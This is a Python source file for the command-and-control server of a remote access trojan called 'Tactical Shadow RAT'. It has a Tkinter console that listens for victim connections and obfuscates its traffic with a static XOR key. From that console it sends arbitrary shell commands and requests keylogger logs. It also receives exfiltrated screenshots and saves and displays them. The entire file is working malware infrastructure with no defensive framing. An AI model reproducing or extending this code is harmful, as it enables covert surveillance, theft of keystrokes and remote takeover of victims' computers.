import socket
import json
import threading
import base64
import os
import time
import io
import tkinter as tk
from tkinter import scrolledtext
from PIL import Image, ImageTk

# --- Connection Settings ---
LISTEN_IP = "0.0.0.0"  # Binds to all local interfaces
LISTEN_PORT = 8080

# Pre-shared 8-bit XOR key for payload obfuscation (must match client key)
KEY = b'simple_xor_key'


def xor_crypt(data: bytes) -> bytes:
    """Applies symmetric XOR encryption/decryption using a static repeating key pattern."""
    return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))


class ServerGUI:
    """
    Graphical User Interface (GUI) controller for the C2 server.
    Manages socket connections, payload serialization, and displays exfiltrated data.
    """
    def __init__(self, root):
        self.root = root
        self.root.title("Tactical Shadow RAT - C2 Controller")
        self.client_sock = None

        # Console window for execution output and status logs
        self.output_area = scrolledtext.ScrolledText(root, width=85, height=22, bg="black", fg="#00FF00")
        self.output_area.pack(pady=10, padx=10)

        # Frame for text command entry
        cmd_frame = tk.Frame(root)
        cmd_frame.pack(fill=tk.X, padx=10, pady=5)

        self.cmd_entry = tk.Entry(cmd_frame, width=65)
        self.cmd_entry.pack(side=tk.LEFT, padx=(0, 5), expand=True, fill=tk.X)
        self.cmd_entry.bind("<Return>", lambda e: self.send_custom_command())

        send_btn = tk.Button(cmd_frame, text="Send Command", command=self.send_custom_command, bg="#333333", fg="white")
        send_btn.pack(side=tk.RIGHT)

        # Quick action control panel
        btn_frame = tk.Frame(root)
        btn_frame.pack(pady=10)

        tk.Button(btn_frame, text="Screenshot", command=self.request_screenshot, bg="#0055ff", fg="white", width=12).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Keylogger Logs", command=self.request_keylog, bg="#ff8800", fg="black", width=12).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Get Hash", command=self.request_hash, bg="#8800cc", fg="white", width=12).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="TERMINATE", command=self.terminate_client, bg="#cc0000", fg="white", width=12).pack(side=tk.LEFT, padx=5)

        # Start listener thread in background
        threading.Thread(target=self.start_server, daemon=True).start()

    def log(self, message: str):
        """Thread-safe UI status logging dispatcher."""
        self.root.after(0, self._log_main_thread, message)

    def _log_main_thread(self, message: str):
        """Appends log text onto ScrolledText widget in main GUI thread."""
        self.output_area.insert(tk.END, message + "\n")
        self.output_area.see(tk.END)

    def send_msg(self, obj: dict):
        """Serializes payload to JSON, encrypts via XOR, and prepends 4-byte length prefix."""
        if self.client_sock:
            try:
                raw = json.dumps(obj).encode('utf-8')
                enc = xor_crypt(raw)
                length = len(enc).to_bytes(4, 'big')
                self.client_sock.sendall(length + enc)
            except Exception as e:
                self.log(f"[-] Error sending message: {e}")
        else:
            self.log("[-] No active client connected.")

    def recv_msg(self) -> dict:
        """Reads 4-byte length header prefix, decrypts XOR frame payload, and parses JSON."""
        if not self.client_sock:
            return None
        try:
            length_bytes = self.client_sock.recv(4)
            if not length_bytes:
                return None
            length = int.from_bytes(length_bytes, 'big')
            data = b''
            while len(data) < length:
                chunk = self.client_sock.recv(length - len(data))
                if not chunk:
                    return None
                data += chunk
            dec = xor_crypt(data)
            return json.loads(dec.decode('utf-8', errors='replace'))
        except Exception:
            return None

    def send_custom_command(self):
        """Sends arbitrary shell command from entry widget to active target agent."""
        cmd = self.cmd_entry.get().strip()
        if cmd:
            self.log(f"[>] Sending Shell Command: {cmd}")
            self.send_msg({"action": cmd})
            self.cmd_entry.delete(0, tk.END)

    def request_screenshot(self):
        """Triggers screenshot capture action on target host."""
        self.log("[*] Requesting screenshot...")
        self.send_msg({"action": "screencap"})

    def request_keylog(self):
        """Retrieves accumulated keystroke logs from target host."""
        self.log("[*] Requesting keystroke logs...")
        self.send_msg({"action": "keylog"})

    def request_hash(self):
        """Requests SHA-256 calculation for log file on target host."""
        self.log("[*] Requesting SHA256 checksum for logs.txt...")
        self.send_msg({"action": "hash", "filename": "logs.txt"})

    def terminate_client(self):
        """Sends graceful termination instruction to target agent process."""
        self.log("[!] Sending termination command...")
        self.send_msg({"action": "terminate"})

    def display_and_save_image(self, b64_data: str):
        """Thread-safe trigger for rendering and saving exfiltrated screenshots."""
        self.root.after(0, self._process_image_main_thread, b64_data)

    def _process_image_main_thread(self, b64_data: str):
        """Saves incoming screenshot image to local storage and renders pop-up window."""
        try:
            raw_data = base64.b64decode(b64_data)
            if not os.path.exists("screenshots"):
                os.makedirs("screenshots")

            filename = f"screenshots/screenshot_{int(time.time())}.png"
            with open(filename, "wb") as f:
                f.write(raw_data)
            self.log(f"[+] Screenshot saved to local disk: {filename}")

            # Load image into PIL
            img = Image.open(io.BytesIO(raw_data))

            # Rescale image to compact presentation size
            img.thumbnail((800, 450))

            top = tk.Toplevel(self.root)
            top.title(f"Target Screenshot - {os.path.basename(filename)}")
            top.resizable(False, False)

            img_tk = ImageTk.PhotoImage(img)
            label = tk.Label(top, image=img_tk)
            label.image = img_tk  # Prevent garbage collection of image object
            label.pack(padx=10, pady=10)

        except Exception as e:
            self.log(f"[-] Failed to render exfiltrated image: {e}")

    def start_server(self):
        """Initializes TCP listening socket and manages incoming client lifecycle."""
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind((LISTEN_IP, LISTEN_PORT))
        server_sock.listen(5)
        self.log(f"[*] C2 Server listening on {LISTEN_IP}:{LISTEN_PORT}...")

        while True:
            client, addr = server_sock.accept()
            self.client_sock = client
            self.log(f"[+] Active connection established from {addr[0]}:{addr[1]}")

            while True:
                msg = self.recv_msg()
                if not msg:
                    self.log("[-] Client session disconnected.")
                    break

                if "result" in msg:
                    self.log(f"[Agent Response]:\n{msg['result']}")

                if "data" in msg:
                    self.display_and_save_image(msg["data"])

            self.client_sock.close()
            self.client_sock = None


if __name__ == "__main__":
    root = tk.Tk()
    app = ServerGUI(root)
    root.mainloop()
